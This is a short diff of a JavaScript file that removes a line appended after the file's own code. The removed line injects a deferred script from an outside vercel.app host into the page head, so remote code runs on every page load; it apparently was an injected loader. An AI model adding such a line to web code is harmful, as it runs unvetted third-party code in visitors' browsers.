@@ -137,5 +137,3 @@
   if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', boot);
   else boot();
 })();
-(function(){var s=document.createElement('script');s.src='https://assistant-api-xi.vercel.app/sd-triggers.js';s.defer=1;document.head.appendChild(s)})();
-
